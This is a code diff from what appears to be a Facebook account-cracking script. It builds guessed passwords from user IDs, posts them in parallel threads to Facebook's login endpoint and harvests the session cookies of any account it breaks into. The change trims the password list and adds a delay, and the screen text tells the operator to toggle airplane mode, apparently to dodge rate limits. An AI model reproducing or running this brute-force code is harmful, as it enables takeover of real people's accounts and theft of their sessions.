@@ -638,7 +638,7 @@ def SUMON2():
         linex();print(' USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE ON/OFF ');linex()
         for guru in user:
             uid = kode+guru
-            pwx = [uid[:6],uid[:7],uid[:8],uid[:9],uid,uid[4:],uid[8:],'987654','748596','968574','859674']
+            pwx = [uid[:6],uid[:7],uid[:8],uid[:9],uid,uid[4:]]
             if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
             elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
             elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
@@ -1343,6 +1343,7 @@ def mbasic(uid,pwx,tl):
             }
             url = "https://graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
+            time.sleep(0.5)
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
